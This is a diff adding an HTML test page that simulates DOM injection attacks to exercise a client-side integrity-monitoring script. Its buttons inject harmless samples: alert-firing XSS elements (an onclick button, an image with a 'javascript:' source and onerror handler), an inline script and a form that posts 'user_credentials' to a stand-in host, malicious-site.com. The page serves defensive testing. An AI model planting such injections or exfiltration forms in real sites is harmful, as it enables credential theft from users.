@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Injection Test</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; }
+        button { 
+            padding: 10px 20px; 
+            margin: 10px; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .safe { background: #28a745; color: white; }
+        .warning { background: #ffc107; color: black; }
+        .danger { background: #dc3545; color: white; }
+        .critical { background: #6f42c1; color: white; }
+        .log { 
+            background: #f8f9fa; 
+            border: 1px solid #dee2e6; 
+            padding: 15px; 
+            margin: 20px 0; 
+            border-radius: 5px;
+            font-family: monospace;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <h1>DOM Injection Detection Test</h1>
+    <p>This page tests the enhanced DOM injection monitoring system. Click the buttons below to simulate different types of attacks:</p>
+    
+    <div>
+        <button class="safe" onclick="injectSafeElement()">Safe Element (div)</button>
+        <button class="warning" onclick="injectMediumRisk()">Medium Risk (hidden input)</button>
+        <button class="danger" onclick="injectHighRisk()">High Risk (iframe)</button>
+        <button class="critical" onclick="injectCritical()">Critical Risk (script with onclick)</button>
+    </div>
+    
+    <div>
+        <button class="warning" onclick="injectStylesheet()">External Stylesheet</button>
+        <button class="danger" onclick="injectInlineScript()">Inline Script</button>
+        <button class="critical" onclick="injectMaliciousForm()">Malicious Form</button>
+        <button class="critical" onclick="injectJavaScriptImage()">JavaScript Image</button>
+    </div>
+
+    <div id="injection-area">
+        <h3>Injection Area:</h3>
+        <!-- Injected elements will appear here -->
+    </div>
+
+    <div class="log" id="console-log">
+        <strong>Console Log:</strong><br>
+        Watch the browser console for integrity monitoring alerts...
+    </div>
+
+    <!-- Load the integrity monitoring script -->
+    <script src="/integrity.js" 
+            data-tenant="demo"
+            data-manifest-endpoint="/tenant/demo/manifest"
+            data-report-endpoint="/tenant/demo/report"></script>
+
+    <script>
+        let injectionCounter = 0;
+
+        function log(message) {
+            const logDiv = document.getElementById('console-log');
+            const timestamp = new Date().toLocaleTimeString();
+            logDiv.innerHTML += `\n[${timestamp}] ${message}`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+            console.log(`[Test] ${message}`);
+        }
+
+        function injectSafeElement() {
+            const div = document.createElement('div');
+            div.innerHTML = `<p>Safe element ${++injectionCounter} - This should NOT trigger alerts</p>`;
+            div.style.background = '#d4edda';
+            div.style.padding = '10px';
+            div.style.margin = '5px';
+            div.style.border = '1px solid #c3e6cb';
+            div.style.borderRadius = '5px';
+            document.getElementById('injection-area').appendChild(div);
+            log('Injected safe div element');
+        }
+
+        function injectMediumRisk() {
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'csrf_token';
+            input.value = 'malicious_token_' + injectionCounter++;
+            document.getElementById('injection-area').appendChild(input);
+            log('Injected hidden input (medium risk)');
+        }
+
+        function injectHighRisk() {
+            const iframe = document.createElement('iframe');
+            iframe.src = 'about:blank';
+            iframe.width = '300';
+            iframe.height = '100';
+            iframe.style.border = '2px solid red';
+            iframe.style.margin = '10px';
+            document.getElementById('injection-area').appendChild(iframe);
+            log('Injected iframe (high risk)');
+        }
+
+        function injectCritical() {
+            const button = document.createElement('button');
+            button.innerHTML = `Malicious Button ${++injectionCounter}`;
+            button.onclick = function() { alert('XSS Attack Executed!'); };
+            button.style.background = '#dc3545';
+            button.style.color = 'white';
+            button.style.padding = '5px 10px';
+            button.style.margin = '5px';
+            document.getElementById('injection-area').appendChild(button);
+            log('Injected button with onclick handler (CRITICAL RISK)');
+        }
+
+        function injectStylesheet() {
+            const link = document.createElement('link');
+            link.rel = 'stylesheet';
+            link.href = 'data:text/css,body{background:red !important;}';
+            document.head.appendChild(link);
+            log('Injected external stylesheet');
+        }
+
+        function injectInlineScript() {
+            const script = document.createElement('script');
+            script.innerHTML = `console.log('Injected inline script ${++injectionCounter}');`;
+            document.getElementById('injection-area').appendChild(script);
+            log('Injected inline script (HIGH RISK)');
+        }
+
+        function injectMaliciousForm() {
+            const form = document.createElement('form');
+            form.action = 'https://malicious-site.com/steal-data';
+            form.method = 'POST';
+            form.innerHTML = `
+                <h4>Malicious Form ${++injectionCounter}</h4>
+                <input type="hidden" name="stolen_data" value="user_credentials">
+                <input type="submit" value="Click to Submit Data" style="background: red; color: white;">
+            `;
+            form.style.border = '2px solid red';
+            form.style.padding = '10px';
+            form.style.margin = '10px';
+            document.getElementById('injection-area').appendChild(form);
+            log('Injected malicious form (CRITICAL RISK)');
+        }
+
+        function injectJavaScriptImage() {
+            const img = document.createElement('img');
+            img.src = 'javascript:alert("XSS via image src!")';
+            img.alt = 'Malicious Image';
+            img.onerror = function() { alert('Image error handler executed!'); };
+            img.style.border = '2px solid purple';
+            img.style.padding = '5px';
+            img.style.margin = '5px';
+            document.getElementById('injection-area').appendChild(img);
+            log('Injected image with javascript: src (CRITICAL RISK)');
+        }
+
+        // Log when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            log('DOM Injection Test Page loaded - Integrity monitoring active');
+        });
+    </script>
+</body>
+</html>
